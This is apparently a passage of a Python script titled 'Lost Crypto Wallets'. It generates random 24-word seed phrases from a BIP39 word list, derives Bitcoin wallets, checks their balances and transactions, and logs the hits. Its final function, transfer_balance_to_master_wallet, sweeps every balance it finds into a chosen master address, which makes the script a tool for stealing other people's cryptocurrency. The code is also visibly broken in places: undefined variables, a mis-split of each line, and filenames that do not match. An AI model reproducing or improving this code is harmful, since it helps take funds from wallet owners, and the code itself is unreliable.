              "subway",
              "success",
              "such",
              "sudden",
              "suffer",
              "sugar",
              "suggest",
              "suit",
              "summer",
              "sun",
              "sunny",
              "sunset",
              "super",
              "supply",
              "supreme",
              "sure",
              "surface",
              "surge",
              "surprise",
              "surround",
              "survey",
              "suspect",
              "sustain",
              "swallow",
              "swamp",
              "swap",
              "swarm",
              "swear",
              "sweet",
              "swift",
              "swim",
              "swing",
              "switch",
              "sword",
              "symbol",
              "symptom",
              "syrup",
              "system",
              "table",
              "tackle",
              "tag",
              "tail",
              "talent",
              "talk",
              "tank",
              "tape",
              "target",
              "task",
              "taste",
              "tattoo",
              "taxi",
              "teach",
              "team",
              "tell",
              "ten",
              "tenant",
              "tennis",
              "tent",
              "term",
              "test",
              "text",
              "thank",
              "that",
              "theme",
              "then",
              "theory",
              "there",
              "they",
              "thing",
              "this",
              "thought",
              "three",
              "thrive",
              "throw",
              "thumb",
              "thunder",
              "ticket",
              "tide",
              "tiger",
              "tilt",
              "timber",
              "time",
              "tiny",
              "tip",
              "tired",
              "tissue",
              "title",
              "toast",
              "tobacco",
              "today",
              "toddler",
              "toe",
              "together",
              "toilet",
              "token",
              "tomato",
              "tomorrow",
              "tone",
              "tongue",
              "tonight",
              "tool",
              "tooth",
              "top",
              "topic",
              "topple",
              "torch",
              "tornado",
              "tortoise",
              "toss",
              "total",
              "tourist",
              "toward",
              "tower",
              "town",
              "toy",
              "track",
              "trade",
              "traffic",
              "tragic",
              "train",
              "transfer",
              "trap",
              "trash",
              "travel",
              "tray",
              "treat",
              "tree",
              "trend",
              "trial",
              "tribe",
              "trick",
              "trigger",
              "trim",
              "trip",
              "trophy",
              "trouble",
              "truck",
              "true",
              "truly",
              "trumpet",
              "trust",
              "truth",
              "try",
              "tube",
              "tuition",
              "tumble",
              "tuna",
              "tunnel",
              "turkey",
              "turn",
              "turtle",
              "twelve",
              "twenty",
              "twice",
              "twin",
              "twist",
              "two",
              "type",
              "typical",
              "ugly",
              "umbrella",
              "unable",
              "unaware",
              "uncle",
              "uncover",
              "under",
              "undo",
              "unfair",
              "unfold",
              "unhappy",
              "uniform",
              "unique",
              "unit",
              "universe",
              "unknown",
              "unlock",
              "until",
              "unusual",
              "unveil",
              "update",
              "upgrade",
              "uphold",
              "upon",
              "upper",
              "upset",
              "urban",
              "urge",
              "usage",
              "use",
              "used",
              "useful",
              "useless",
              "usual",
              "utility",
              "vacant",
              "vacuum",
              "vague",
              "valid",
              "valley",
              "valve",
              "van",
              "vanish",
              "vapor",
              "various",
              "vast",
              "vault",
              "vehicle",
              "velvet",
              "vendor",
              "venture",
              "venue",
              "verb",
              "verify",
              "version",
              "very",
              "vessel",
              "veteran",
              "viable",
              "vibrant",
              "vicious",
              "victory",
              "video",
              "view",
              "village",
              "vintage",
              "violin",
              "virtual",
              "virus",
              "visa",
              "visit",
              "visual",
              "vital",
              "vivid",
              "vocal",
              "voice",
              "void",
              "volcano",
              "volume",
              "vote",
              "voyage",
              "wage",
              "wagon",
              "wait",
              "walk",
              "wall",
              "walnut",
              "want",
              "warfare",
              "warm",
              "warrior",
              "wash",
              "wasp",
              "waste",
              "water",
              "wave",
              "way",
              "wealth",
              "weapon",
              "wear",
              "weasel",
              "weather",
              "web",
              "wedding",
              "weekend",
              "weird",
              "welcome",
              "west",
              "wet",
              "whale",
              "what",
              "wheat",
              "wheel",
              "when",
              "where",
              "whip",
              "whisper",
              "wide",
              "width",
              "wife",
              "wild",
              "will",
              "win",
              "window",
              "wine",
              "wing",
              "wink",
              "winner",
              "winter",
              "wire",
              "wisdom",
              "wise",
              "wish",
              "witness",
              "wolf",
              "woman",
              "wonder",
              "wood",
              "wool",
              "word",
              "work",
              "world",
              "worry",
              "worth",
              "wrap",
              "wreck",
              "wrestle",
              "wrist",
              "write",
              "wrong",
              "yard",
              "year",
              "yellow",
              "you",
              "young",
              "youth",
              "zebra",
              "zero",
              "zone",
              "zoo"]

  # Initialize visualization components if required
  for _ in range(num_combinations):
    # Generate a random combination of words
    random_combination = random.sample(words, r)
    # Join the words together with spaces to form a seed phrase
    seed_phrase = " ".join(random_combination)

    try:
      # Create a wallet using the seed phrase
      w = Wallet.create(f"Wallet_{_}", keys=seed_phrase, network='bitcoin')
      # Get the balance of the wallet
      balance = w.balance()

      # If the balance is 0, print a message and add it to the list
      if balance == 0:
        print(Fore.BLUE + "0.0 BTC - Wallet found")
        with open('found_wallets_no_balance.txt', 'a') as f:
          f.write(seed_phrase + '\n')
        if visualize:
          # Add the seed phrase to the top frame
          add_to_box(right_frame_top, seed_phrase)
          # Update the display
          root.update()
      else:
        # If the balance is not 0, print a message and add it to the list
        print(Fore.GREEN + f"{balance} BTC - Wallet found")
        with open('found_wallets.txt', 'a') as f:
          f.write(f"{seed_phrase}\n{balance} BTC\n")
        if visualize:
          # Add the seed phrase to the bottom frame
          add_to_box(right_frame_bottom, f"Wallet with balance: {balance} BTC")
          # Update the display
          root.update()
    except Exception as e:
      # If there is an exception, print the exception and continue
      pass
  # Start the Tkinter main loop if visualization is enabled
  if visualize:
    root.mainloop()



def create_scrollable_frame(parent, width, height):
  """
  Create a scrollable frame with the given width and height

  :param parent: parent widget
  :param width: width of the frame
  :param height: height of the frame
  """
  # Create a canvas and a scrollbar
  canvas = tk.Canvas(parent, width=width, height=height)
  scrollbar = ttk.Scrollbar(parent, orient="vertical", command=canvas.yview)

  # Create a frame inside the canvas
  scrollable_frame = ttk.Frame(canvas)

  # Bind the configure event to update the scroll region
  scrollable_frame.bind(
      "<Configure>",
      lambda e: canvas.configure(scrollregion=canvas.bbox("all")))

  # Create the window inside the canvas and add the frame to it
  canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

  # Configure the canvas and scrollbar
  canvas.configure(yscrollcommand=scrollbar.set)
  canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
  scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

  # Return the scrollable frame
  return scrollable_frame


def tkinterload():
  global root, right_frame_top, right_frame_bottom

  # Create the main window
  root = tk.Tk()
  root.title("Lost Crypto Wallets")
  root.geometry("600x400")

  # Create the left frame
  left_frame = ttk.Frame(root, width=200, height=400, relief=tk.RIDGE)
  # Create the right frame
  right_frame_top = ttk.Frame(root, width=200, height=200, relief=tk.RIDGE)
  right_frame_bottom = ttk.Frame(root, width=200, height=200, relief=tk.RIDGE)

  # Disable propagation for the frames
  left_frame.pack_propagate(False)
  right_frame_top.pack_propagate(False)
  right_frame_bottom.pack_propagate(False)

  # Pack the frames
  left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
  right_frame_top.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
  right_frame_bottom.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)

  # Create scrollable frames
  create_scrollable_frame(left_frame, 200, 400)
  create_scrollable_frame(right_frame_top, 200, 200)
  create_scrollable_frame(right_frame_bottom, 200, 200)


def print_combinations(filename, r=24, visualize=False):
  # Open the file and read all the lines into a list
  with open(filename, 'r') as file:
    words = [line.strip() for line in file.readlines()]

  # Check if there are enough words to generate combinations from
  if len(words) < r:
    # If not, print an error message and return
    print(
        f"Error: Not enough words. The file contains only {len(words)} words.")
    return

  # Iterate over all combinations of words
  for combination in itertools.combinations(words, r):
    # Join the words together with spaces to form a seed phrase
    seed_phrase = " ".join(combination)

    try:
      # Create a wallet using the seed phrase
      w = Wallet.create(f"Wallet_{random.randint(0, 100000)}",
                        keys=seed_phrase,
                        network='bitcoin')
      # Get the balance of the wallet
      balance = w.balance()

      # If the balance is 0, print a message and add it to the list
      if balance == 0:
        print(Fore.BLUE + "0.0 BTC - Wallet found")
        found_wallets_no_balance.append(seed_phrase)
        flask_thread.start()
        with open('found_wallets_no_balance.txt', 'a') as f:
          f.write(seed_phrase + '\n')
        if visualize and right_frame_top:
          # Add the seed phrase to the top frame
          add_to_box(right_frame_top, seed_phrase)
      else:
        # If the balance is not 0, print a message and add it to the list
        money = money + balance
        print(Fore.GREEN + f"{balance} BTC - Wallet found")
        found_wallets.append(seed_phrase)
        with open('found_wallets.txt', 'a') as f:
          f.write(f"{seed_phrase}\n{balance} BTC\n")
        if visualize and right_frame_bottom:
          # Add the seed phrase to the bottom frame
          add_to_box(right_frame_bottom, f"Wallet with balance: {balance} BTC")
    except Exception:
      # If there is an exception, print the exception and continue
      pass


def search(visualize=True,
           r=24,
           num_combinations=10000000000,
           file=True,
           log=False,
           web=False):
    try:
        # Start the timer for the search
        start_time = time.time()

        # Start the Flask thread if web is enabled
        if web:
            flask_thread.start()

        # Load the Tkinter UI if visualization is enabled
        if visualize:
            tkinterload()

        # Print the combinations if log is enabled
        if log:
            print_combinations('words.txt', r=r, visualize=visualize)

        # Search for lost wallets if log is not enabled
        else:
            lostwallets('words.txt',
                        r=r,
                        num_combinations=num_combinations,
                        visualize=visualize)

        # Start the Tkinter main loop if visualization is enabled
        if visualize:
            if root is not None:  # Check to prevent null pointer exception
                root.mainloop()

    except Exception as e:
        # Print the exception if an error occurs
        print(f"An error occurred: {e}")


def checkhistory(filename):
  # Create an empty list to store the results
  empty = []
  number = 0

  # Read words from file and store them in a list (strip trailing newline)
  with open(filename, 'r') as file:
    wallets = [line.rstrip() for line in file]

  # Generate random combinations of words
  print(Fore.YELLOW + ("Checking for transactions..."))

  # Iterate over the wallets and check if there are any transactions
  for i in wallets:
    try:
      seed_phrase = i
      w = Wallet.create(
          str("Wwaalle" + seed_phrase[2] + seed_phrase[10] + seed_phrase[18] +
              "ett" + seed_phrase[randint(0, 24)] + str(randint(0, 100000))),
          keys=seed_phrase,
          network='bitcoin')
      number += 1
      # Check if the wallet has any transactions
      if len(w.transactions_export()) == 0:
        print(Fore.RESET + (str(number) + "/" + str(len(wallets))))
        empty.append(seed_phrase)
      else:
        print(Fore.GREEN + ("Transactions found in wallet"))
        with open('found_wallets_with_transactions.txt', 'a') as file:
          file.write(f"{seed_phrase}\n")
          file.close()
    except:
      pass

  # Print the results of the check
  print(Fore.YELLOW + ("Checking is complete..."))
  print()
  print(Fore.YELLOW + ("Saving empty wallets..."))
  for item in empty:
    with open('emptywallets.txt', 'a') as file2:
      file2.write(f"{item}\n")
  file2.close()
  print(Fore.CYAN + ("Check complete"))
  print(Fore.RESET)


def transfer_balance_to_master_wallet(master_wallet_address):
    # Read the file containing wallets with balance
    with open('wallets_with_balance.txt', 'r') as file:
        # Retrieve all lines, each representing a wallet
        wallets = file.readlines()

    # Iterate over each wallet in the list
    for wallet in wallets:
        # Remove any leading or trailing whitespace
        wallet = wallet.strip()
        # Split the wallet information into seed phrase and balance
        seed_phrase, balance = wallet.split('\n')
        # Extract the numeric value of the balance
        balance = float(balance.split(' ')[0])

        try:
            # Create a wallet object using the seed phrase
            w = Wallet.create(f"Wallet_{seed_phrase}", keys=seed_phrase, network='bitcoin')
            # Send the balance to the master wallet address
            w.send_to(master_wallet_address, balance)
            # Print a success message indicating the transfer details
            print(f"Transferred {balance} BTC from wallet {seed_phrase} to {master_wallet_address}")
        except Exception as e:
            # Print an error message if the transfer fails
            print(f"Error transferring balance from wallet {seed_phrase}: {e}")




#This is the section of the code that will be executed when the program is run
#This is the part you can modify to suit your needs
#Example usage of the functions
search(web=True, log=True)
checkhistory('found_wallets_nobalance.txt')
